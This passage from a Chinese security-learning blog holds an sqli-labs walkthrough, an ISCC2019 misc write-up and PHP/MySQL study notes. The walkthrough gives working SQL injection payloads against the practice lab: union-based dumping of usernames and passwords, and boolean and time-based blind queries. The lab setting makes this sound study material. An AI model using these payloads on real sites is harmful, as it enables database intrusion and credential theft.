<p>然后进行爆字段<code>?id=0&#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;),3 --+</code><br><img src="https://img-blog.csdnimg.cn/20190609203309339.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l4bF9k,size_16,color_FFFFFF,t_70" alt><br>接下来把用户名和密码全爆出来<code>?id=0&#39; union select 1,group_concat(username,0x3a,password),3 from users --+</code>（其中<code>0x3a</code>是用来区分用户名和密码，不至于混淆）<br><img src="https://img-blog.csdnimg.cn/20190609203607711.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l4bF9k,size_16,color_FFFFFF,t_70" alt></p>
<h2 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h2><p><strong>GET-Error based-Intiger based（基于错误的GET整型注入）</strong><br>源代码发现<br><img src="https://img-blog.csdnimg.cn/20190609204444709.PNG" alt><br>根据Less-1可知，一共三列然后<code>?id=0 union select 1,database(),user()</code>就能得出当前数据库名和当前用户名<br><img src="https://img-blog.csdnimg.cn/20190609205320998.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l4bF9k,size_16,color_FFFFFF,t_70" alt></p>
<h2 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h2><p><strong>GET-Error based -Single quotes with twist-string（基于错误的GET单引号变形字符型注入）</strong><br>先尝试<code>?id=1&#39;</code><br><img src="https://img-blog.csdnimg.cn/20190609205817867.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l4bF9k,size_16,color_FFFFFF,t_70" alt><br>可以知道应该是单引号和括号的闭合<code>?id=1&#39;)--+</code>得<br><img src="https://img-blog.csdnimg.cn/20190609205919304.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l4bF9k,size_16,color_FFFFFF,t_70" alt></p>
<h2 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h2><p><strong>GET-Error based-Double Quotes-String（基于错误的GET双引号字符型注入）</strong><br>尝试<code>?id=1&#39;</code>发现没有报错，接着尝试一下<code>?id=1&quot;</code>发现<br><img src="https://img-blog.csdnimg.cn/20190610193034440.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l4bF9k,size_16,color_FFFFFF,t_70" alt><br>发现是双引号和括号的闭合，于是<code>?id=1&quot;)--+</code>就可以了<br><img src="https://img-blog.csdnimg.cn/20190610193218444.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l4bF9k,size_16,color_FFFFFF,t_70" alt><br>后面的步骤与Less-1一样就可以了。</p>
<h2 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h2><p><strong>GET-Double Injection-Single Quotes-String（双注入GET单引号字符型注入）</strong><br>尝试<code>?id=1&#39;</code>，出现<br><img src="https://img-blog.csdnimg.cn/20190610194121609.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l4bF9k,size_16,color_FFFFFF,t_70" alt><br>可以判断出是单引号闭合。</p>
<h2 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h2><p><strong>GET-Double Injection-Double Quotes-String（双注入GET双引号字符型注入）</strong></p>
<p>尝试<code>?id=1&quot;</code>，出现<br><img src="https://img-blog.csdnimg.cn/20190611193356651.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l4bF9k,size_16,color_FFFFFF,t_70" alt><br>可以判断出是双引号闭合。</p>
<h2 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h2><p><strong>GET-Dump into outfile-String（导出文件GET字符型注入）</strong><br>尝试<code>?id=1&#39;</code>,出现报错<br><img src="https://img-blog.csdnimg.cn/20190611194149379.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l4bF9k,size_16,color_FFFFFF,t_70" alt><br>继续尝试<code>?id=1&#39;--+</code>，发现没有用。于是换一种闭合方式试一下<code>?id=1&#39; or &#39;1&#39;=&#39;1</code><br><img src="https://img-blog.csdnimg.cn/20190611194501252.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l4bF9k,size_16,color_FFFFFF,t_70" alt></p>
<h2 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h2><p><strong>GET-Blind-Boolian Based-Single Quotes（布尔型单引号GET盲注）</strong><br>尝试<code>?id=1&#39;</code>，发现没有报错，页面也没有返回东西，是bool盲注。<br><em>盲注需要掌握一些MySQL的相关函数：<br>length(str)：返回str字符串的长度。<br>substr(str, pos, len)：将str从pos位置开始截取len长度的字符进行返回。注意这里的pos位置是从1开始的，不是数组的0开始<br>mid(str,pos,len):跟上面的一样，截取字符串<br>ascii(str)：返回字符串str的最左面字符的ASCII代码值。<br>ord(str):同上，返回ascii码<br>if(a,b,c) :a为条件，a为true，返回b，否则返回c，如if(1&gt;2,1,0),返回0<br>要记得常见的ASCII，A:65,Z:90 a:97,z:122,  0:48, 9:57<br>首先select database()查询数据库<br>ascii(substr((select database()),1,1))：返回数据库名称的第一个字母,转化为ascii码<br>ascii(substr((select database()),1,1))&gt;64：ascii大于64就返回true，if就返回1，否则返回0</em><br>构造语句<code>?id=1&#39; and if(ascii(substr((select database()),1,1))&gt;64, 1, 0) #</code>尝试一下<br><img src="https://img-blog.csdnimg.cn/20190611195813391.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l4bF9k,size_16,color_FFFFFF,t_70" alt></p>
<h2 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h2><p><strong>GET-Blind-Time based-Single Quotes（基于时间的GET单引号盲注）</strong><br>无论尝试什么，页面都没发生变化，是时间盲注。<br><img src="https://img-blog.csdnimg.cn/20190611200742818.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l4bF9k,size_16,color_FFFFFF,t_70" alt><br>尝试<code>?id=1&#39; and if(ascii(substr(database(),1,1))&gt;115, 0, sleep(5))#</code>，页面过了一会响应，判断闭合方式为单引号。</p>
<h2 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h2><p><strong>GET-Blind-Time based-double quotes（基于时间的双引号盲注）</strong><br>上一个题目中的单引号改为双引号即可。。。</p>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>上面的题型大概分4种<br>1.联合查询注入<br>2.报错注入<br>3.bool盲注<br>4.时间盲注<br>每种题型也有自己独特的解法：<br>1.对于联合查询注入，可以利用Union，直接select出你想要的信息<br>2.对于报错注入，可以很快的找到引号闭合方式，使用特定的函数使其报错，得到信息<br>3.对于bool盲注，没有回显，但是可以辨别出是ture还是fasle<br>4.对于时间盲注，和bool盲注异曲同工，但是连回显都没有了，所以需要根据页面响应时间来判断是ture or false<br>另：bool盲注以及时间盲注可以写脚本来解决，这个还需后期学习。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yxld.github.io/2019/06/05/ISCC2019—MISC总结/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="yxld">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="clam">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/06/05/ISCC2019—MISC总结/" itemprop="url">ISCC2019——MISC总结</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-06-05T20:48:14+08:00">
                2019-06-05
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>ISCC2019已经结束了，虽然做不出来几道题，但是经过后来的学习觉得还是有必要总结一下的。</p>
<h2 id="MISC1（隐藏的信息）"><a href="#MISC1（隐藏的信息）" class="headerlink" title="MISC1（隐藏的信息）"></a>MISC1（隐藏的信息）</h2><p>这道题主要是进制转换后再转ascll码，然后base解码<br><img src="https://img-blog.csdnimg.cn/2019060519325369.jpg" alt><br>首先考虑到每个数字的大小，就发现都是八进制，然后转为十进制<br><img src="https://img-blog.csdnimg.cn/20190605194340408.PNG" alt><br>然后十进制转ascll码得<br><img src="https://img-blog.csdnimg.cn/20190605194434348.PNG" alt><br>看起来应该是base解码，不妨试一下<br><img src="https://img-blog.csdnimg.cn/2019060519465481.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l4bF9k,size_16,color_FFFFFF,t_70" alt><br>OK，flag出来了……</p>
<h2 id="MISC2（倒立屋）"><a href="#MISC2（倒立屋）" class="headerlink" title="MISC2（倒立屋）"></a>MISC2（倒立屋）</h2><p><strong>房屋为什么会倒立！是重力反转了吗？</strong><br>这道题主要用到的是LSB隐写，用stegsolve打开图片<br><img src="https://img-blog.csdnimg.cn/20190605195707137.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l4bF9k,size_16,color_FFFFFF,t_70" alt><br>接下来就简单了，会用工具就行<br><img src="https://img-blog.csdnimg.cn/20190605195742292.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l4bF9k,size_16,color_FFFFFF,t_70" alt><br>没错，flag又出来了，不过是倒立的呦（<strong>9102_cCsI</strong>）</p>
<h2 id="MISC3（Keyes’-secret）"><a href="#MISC3（Keyes’-secret）" class="headerlink" title="MISC3（Keyes’ secret）"></a>MISC3（Keyes’ secret）</h2><p>这道题主要是关于键盘的，需要仔细观察键盘的规律。<br>首先找出FLAG位置<br><img src="https://img-blog.csdnimg.cn/20190605200224602.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l4bF9k,size_16,color_FFFFFF,t_70" alt><br>键盘字母连起来对应另一个字母<br><img src="https://img-blog.csdnimg.cn/20190605200459255.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l4bF9k,size_16,color_FFFFFF,t_70" alt><br>OK，这道题过程有那么一点点麻烦</p>
<h2 id="MISC4（无法执行的exe）"><a href="#MISC4（无法执行的exe）" class="headerlink" title="MISC4（无法执行的exe）"></a>MISC4（无法执行的exe）</h2><p>这道题主要是png图片头部格式有问题。<br><img src="https://img-blog.csdnimg.cn/20190605201236339.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l4bF9k,size_16,color_FFFFFF,t_70" alt><br>咋一看还以为是base解码，不妨试一下<br><img src="https://img-blog.csdnimg.cn/20190605201404790.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l4bF9k,size_16,color_FFFFFF,t_70" alt><br>然后发现PNG，用winhex打开，对比png文件格式，发现问题，修复它<br><img src="https://img-blog.csdnimg.cn/20190605202300736.jpg" alt><br><img src="https://img-blog.csdnimg.cn/20190605202318134.PNG" alt><br>然后得到二维码一张，扫它<br><img src="https://img-blog.csdnimg.cn/20190605202403403.png" alt><br>得到<strong>ISCC_2019</strong></p>
<h2 id="MISC5（他们能在一起吗）"><a href="#MISC5（他们能在一起吗）" class="headerlink" title="MISC5（他们能在一起吗）"></a>MISC5（他们能在一起吗）</h2><p>这道题主要是数据隐藏<br>下载附件得到png图片<br><img src="https://img-blog.csdnimg.cn/20190605203148784.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l4bF9k,size_16,color_FFFFFF,t_70" alt><br>扫描得到<br><img src="https://img-blog.csdnimg.cn/20190605203355953.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l4bF9k,size_16,color_FFFFFF,t_70" alt><br>base解码后<br><img src="https://img-blog.csdnimg.cn/20190605203506723.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l4bF9k,size_16,color_FFFFFF,t_70" alt><br>然后url解码得到<br><img src="https://img-blog.csdnimg.cn/20190605203702899.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l4bF9k,size_16,color_FFFFFF,t_70" alt><br><strong>PASS{0K_I_L0V3_Y0u!}</strong><br>你以为这就结束了？不这才刚刚开始（因为flag并不正确……）<br>图片格式改为压缩包格式发现<br><img src="https://img-blog.csdnimg.cn/20190605204113467.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l4bF9k,size_16,color_FFFFFF,t_70" alt><br>输入之前解出来的括号里面的内容打开<br><img src="https://img-blog.csdnimg.cn/20190605204325392.PNG" alt><br>OK了，flag是他们没有在一起。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yxld.github.io/2019/04/29/php学习笔记（四）/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="yxld">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="clam">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/04/29/php学习笔记（四）/" itemprop="url">php学习笔记（四）</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-04-29T16:45:26+08:00">
                2019-04-29
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="一-会话控制"><a href="#一-会话控制" class="headerlink" title="一.会话控制"></a>一.会话控制</h2><p>http是一个无状态的协议，此协议无法维护两个事务之间的联系。当一个用户请求一个页面后再请求另外一个页面时，http无法告诉我们这两个请求是来自同一个人。为了使得网站可以跟踪客户端与服务器之间的交互，保存和记忆每个用户的身份和信息，这样就产生了会话控制。</p>
<h3 id="（一）cookie"><a href="#（一）cookie" class="headerlink" title="（一）cookie"></a>（一）cookie</h3><p>当用户访问服务器时，服务器可以设置和访问cookie的信息。cookie保存在客户端，通常是IE和Firefox浏览器的cookie临时文件夹中，可以手动删除。</p>
<h4 id="1-向客户端电脑中设置cookie"><a href="#1-向客户端电脑中设置cookie" class="headerlink" title="1.向客户端电脑中设置cookie"></a>1.向客户端电脑中设置cookie</h4><pre><code>setcookie (name,value,expire,path,domain,secure);
</code></pre><p>name参数必需，名称；<br>value参数必需，值；<br>expire参数可选，有效期；<br>path参数可选，服务器路径；<br>domain参数可选，域名；<br>secure参数可选，规定是否通过安全的HTTPS连接来传输cookie。</p>
<h4 id="2-在服务器端上读取cookie的内容"><a href="#2-在服务器端上读取cookie的内容" class="headerlink" title="2.在服务器端上读取cookie的内容"></a>2.在服务器端上读取cookie的内容</h4><pre><code>$_COOKIE
</code></pre><h4 id="3-将多维数组应用于cookie中"><a href="#3-将多维数组应用于cookie中" class="headerlink" title="3.将多维数组应用于cookie中"></a>3.将多维数组应用于cookie中</h4><pre><code>setcookie(&quot;member[name]&quot;,&apos;姓名&apos;);
setcookie(&quot;member[email]&quot;,&apos;1234567890@qq.com&apos;);
</code></pre><h4 id="4-删除Cookie"><a href="#4-删除Cookie" class="headerlink" title="4.删除Cookie"></a>4.删除Cookie</h4><pre><code>setcookie(&quot;member&quot;,&apos;&apos;,time()-1);
</code></pre><p><strong>注：使用setcookie删除cookie的时候，需要与当初设置cookie的时候参数一致。</strong></p>
<h3 id="（二）session"><a href="#（二）session" class="headerlink" title="（二）session"></a>（二）session</h3><p>session与cookie不同，是将用户参数留在服务器端。session从用户访问页面开始，到断开与网站连接为止，形成一个会话的生命周期。</p>
<h4 id="1-开启session"><a href="#1-开启session" class="headerlink" title="1.开启session"></a>1.开启session</h4><pre><code>session_start();
</code></pre><p> <strong>注：这个函数没有参数，且返回值均为true。</strong></p>
<h2 id="二-MySQL"><a href="#二-MySQL" class="headerlink" title="二.MySQL"></a>二.MySQL</h2><p>MySQL是关系模型数据库管理系统，以稳定、可靠、快速、可信而成为世界上最受欢迎的数据库管理系统之一。无论是小型网站还是大型网站，都可以通过MySQL完成数据存储业务。</p>
<h3 id="（一）-数据库基本概念"><a href="#（一）-数据库基本概念" class="headerlink" title="（一）.数据库基本概念"></a>（一）.数据库基本概念</h3><p><strong>数据库</strong>：信息存储的仓库，包括一系列的关系措施；<br><strong>表</strong>:一个数据库中可以有若干张表（形式上你可以看出我们日常生活中建立的表）；<br><strong>字段</strong>:表里面的信息会分若干个栏目来存，这些栏目呢，我们在数据库技术叫”字段”,栏目里面存的具体信息叫”字段值”；<br><strong>记录</strong>：一条信息我们叫一条记录。<br><strong>一个数据库管理系统中可以建立若干个数据库，每个数据库中又可以建立若干张表,每张表中可以有若干条记录。</strong></p>
<h3 id="（二）MySQL支持的数据类型"><a href="#（二）MySQL支持的数据类型" class="headerlink" title="（二）MySQL支持的数据类型"></a>（二）MySQL支持的数据类型</h3><p>数值类型、日期类型、字符串类型</p>
<h3 id="（三）-My-SQL使用入门"><a href="#（三）-My-SQL使用入门" class="headerlink" title="（三）(My)SQL使用入门"></a>（三）(My)SQL使用入门</h3><h4 id="1-SQL语言简介"><a href="#1-SQL语言简介" class="headerlink" title="1.SQL语言简介"></a>1.SQL语言简介</h4><p>SQL 是用于访问和处理数据库的标准的计算机语言。<br>SQL指结构化查询语言，全称是 Structured Query Language。<br>SQL 可以访问和处理数据库。<br>SQL 是一种 ANSI（American National Standards Institute 美国国家标准化组织）标准的计算机语言。</p>
<h4 id="2-SQL分类"><a href="#2-SQL分类" class="headerlink" title="2.SQL分类"></a>2.SQL分类</h4><p><strong>1)DDL(Data Definition Languages)语句</strong><br>数据定义语句，通过这类语言可以对数据库进行创建删除更改。<br><strong>2)DML(Data Manipulation Language)语句</strong><br>数据操纵语句，用于添加、删除、更新和查询数据库记录并检查数据完整性。<strong>3)DCL(Data Control Language)语句</strong><br>数据控制语句，通过此类语句可以对数据库的相关权限进行设置。</p>
<h4 id="3-DDL语句"><a href="#3-DDL语句" class="headerlink" title="3.DDL语句"></a>3.DDL语句</h4><p>对数据库内部的对象进行创建、删除、修改等操作的语言,DDL语句更多的是由数据库管理员(DBA)使用，开发人员一般很少使用。</p>
<pre><code>show databases;    //查看数据库列表
</code></pre><p><strong>1)创建数据库</strong></p>
<pre><code>create database 数据库名;
</code></pre><p>选择要操作的数据库：USE 数据库; 对于要操作的数据库我们需要使用use来选择一下。<br>查看数据库中所有的数据表show tables;<br><strong>2)删除数据库</strong></p>
<pre><code>drop database 数据库名称;
</code></pre><p>   <strong>3)创建表</strong>(在哪个数据库里面创建表需要先使用use选择到那个要操作的数据库)<br>创建表</p>
<pre><code>create table 表名(
        字段1名 字段1类型  列的约束条件,
        字段2名 字段2类型  列的约束条件,
        ...
                )
</code></pre><p>创建完表之后可以查看表的定义</p>
<pre><code>desc 表名;
</code></pre><p>查看创建表的SQL语句</p>
<pre><code>show create table 表名 \G
</code></pre><p>另： \G选项使得记录能够按照字段竖向排列，以便更好地显示内容较长的记录，\G后面无需再加分号。<br><strong>4)删除表</strong></p>
<pre><code>drop table 表名;
</code></pre><p><strong>5)修改表</strong><br>修改表的字段类型</p>
<pre><code>alter table 表名 modify [column] 字段定义  [first|after 字段名];
</code></pre><p>增加表字段</p>
<pre><code>alter table 表名 add [column] 字段定义 [first|after 字段名];
</code></pre><p>删除表字段 </p>
<pre><code>alter table 表名 drop [column]  字段名;
</code></pre><p>字段改名</p>
<pre><code>alter table 表名 change [column] 旧的字段名 字段定义 [first|after 字段名];
</code></pre><p>注：change与modify都可以修改表的定义，不同的是change后面需要接两次列名，不方便，但是优点是change可以修改字段名称<br>修改字段排列排序<br><em>前面介绍的字段增加和修改语法(add/change/modify)中，都有一个可选项first|after 字段名,这个选择可以用来修改。字段在表中的位置新增的字段默认是加载在表中最后位置，而change/modify 默认都不会改变字段的位置。</em></p>
<pre><code>alter table t1 modify id2 tinyint first;
alter table t1 modify id2 tinyint after id1;
</code></pre><p>注意：change/first|after 字段名 这些关键字都是属于MySQL在标准SQL上的扩展，在其他的数据库上不一定适用<br><strong>6)更改表名</strong></p>
<pre><code>alter table 表名 rename [to] 新的表名;
</code></pre><h4 id="4-DML语句"><a href="#4-DML语句" class="headerlink" title="4.DML语句"></a>4.DML语句</h4><pre><code>select * from 表名;//查询
</code></pre><p><strong>1)插入记录</strong><br><code>insert into 表名(字段1,字段2,字段3,...,字段n)  values(值1,值2,值3,...,值n);</code><br>也可以不用指定字段名，但是values后面的顺序应该和字段的排序一致<br>多条：</p>
<pre><code>insert into 表名(字段1,字段2,字段3,...,字段n)
                values
                (值1,值2,值3,...,值n),
                (值1,值2,值3,...,值n),
                (值1,值2,值3,...,值n)
                ;
</code></pre><p><strong>2)更新记录</strong><br>更新一个表</p>
<pre><code>update 表名 set 字段1=值1,字段2=值2,...字段n=值n [where 条件];
</code></pre><p>更新多个表中数据</p>
<pre><code>update 表1,表2,...表n set 表1.字段1=表达式1,表n.字段n=表达式n [where 条件];
</code></pre><p>注：多表更新更多的用在根据一个表的字段来动态的更新另外一个表的字段<br><strong>3)删除记录</strong><br>删除单表中的数据  </p>
<pre><code>delete from 表名 [where 条件];
</code></pre><p>删除多个表中的数据</p>
<pre><code>delete 表1,表2,...表n from 表1,表2,...表n [where 条件];
</code></pre><p>不管是单表还是多表，不加where条件将会把表中的所有记录删除，所以操作时一定要小心。<br><strong>4)查询记录</strong></p>
<pre><code>select 字段名|* from 表名;
</code></pre><p>查询不重复的记录</p>
<pre><code>SELECT distinct field1,field2 FROM 表名;
</code></pre><p>只要field1,field2任何一个字段有不同就会被选择。一般使用distinct,只筛选一个字段。<br>注：条件字段比较符号：=,&lt;,&gt;,&gt;=,&lt;=,!=等比较运算符多个条件之间可以使用or and等，where 后面接条件</p>
<pre><code>select * from 表名 where 条件
</code></pre><p>排序和限制<br>排序:</p>
<pre><code>//asc:由低到高，也是默认值
 select * from employee order by salary asc;
 //desc:由高到底
 select * from employee order by salary desc;
 //多个字段排序
 select * from employee order by salary desc,id desc;
</code></pre><p>限制:<br>在语句的最后面 加上limit 数字1,数字2 来进行查询数量的限制。<br>limit 数字1,数字2     数字1代表从第几条记录开启取(是从0开始的)，数字2代表取几条！<br>聚合</p>
<pre><code>①sum求和
select sum(字段名) from 表名;
②count记录总数
select count(*|字段名) from 表名;
③max最大值
select max(字段名) from 表名;
④min最小值
select min(字段名) from 表名;
⑤GROUP BY分类聚合
select department,sum(salary) from employee group by department;
⑥WITH ROLLUP分类聚合后的结果进行再汇总
select sum(salary) from employee group by department with rollup;
⑦HAVING
注意：having和where的区别在于，having是对聚合后的结果进行条件过滤，而where是在聚合前就对记录进行过滤 ，应该尽可能的对记录进行先过滤！
select sum(salary) from employee group by department having sum(salary)&gt;1000;
在一起使用：select sum(id),max(id),min(id),count(*) from a1;
</code></pre><p><strong>5)表连接</strong><br>需求：显示多个表中的字段的时候即可使用表连接<br><strong>连接分类</strong><br>内连接：选取两张表中相互匹配的记录<br>外连接：不仅仅选取两张相互匹配的记录，并且会选出其他不匹配的记录<br><strong>外连接</strong><br>左连接<br>概念：包含左边表中的所有记录(包括右表中没有和它匹配的记录)</p>
<pre><code>select ename,deptname from emp left join dept on emp.deptno=dept.deptno;
</code></pre><p>右连接<br>概念：包含右边表中的所有记录(包括左表中没有和它匹配的记录)左连接和右连接是可以相互转换的。<br><strong>6）子查询</strong><br>需求：一个查询需要另外一个查询的结果参与的时候<br>用于子查询的关键字:in<br>语法：<code>select * from employee where id in(select eid from employee_late);</code><br>in 在..里面<br>注意点 in后面的子语句必须只返回一个字段<br>若查询结果唯一(只有一条)可以使用=代替in<br>not in与in相反<br>exists<br>语法：<code>select语句 where exists(select 语句);</code><br>exists：后面那个子语句有没有查询出记录来，如果查询出记录来返回true,否则就是false，并且查询出来的记录的具体的值是NULL也是没有关系,也是返回true.<br>not exits与exists相反<br><code>select * from emp where deptno in(select deptno from dept);</code></p>
<p>若查询结果唯一可以使用=代替in</p>
<pre><code>select * from emp where deptno=(select deptno from dept limit 1);
</code></pre><p><strong>7）记录联合</strong><br>我们常常会碰到需要将两个表或者多个表的数据按照一定的查询条件查询出来后，将结果合并到一起显示这是就需要用到记录联合。<br>多个select 语句用UNION或者UNION ALL隔开即可实现<br>区别：前者会将多个查询结果合并后并且进行去除重复后返回<br>后者：则直接合并并不去除重复<br>联合的条件：查询的列个数要相等</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yxld.github.io/2019/04/28/html+css+php+cookie+mysql制作一个简易的登陆网页/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="yxld">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="clam">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/04/28/html+css+php+cookie+mysql制作一个简易的登陆网页/" itemprop="url">html+css+php+cookie+mysql制作一个简易的登陆网页</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-04-28T15:56:57+08:00">
                2019-04-28
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>一味的学习未免有些枯燥无味，偶尔有个任务检验一下学习成果还是很有必要的</p>
<h2 id="一-环境准备"><a href="#一-环境准备" class="headerlink" title="一.环境准备"></a>一.环境准备</h2><p><strong>一切开始的基本</strong></p>
<h3 id="1-打开phpstudy"><a href="#1-打开phpstudy" class="headerlink" title="1.打开phpstudy"></a>1.打开phpstudy</h3><p><img src="https://img-blog.csdnimg.cn/20190428150656960.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l4bF9k,size_16,color_FFFFFF,t_70" alt></p>
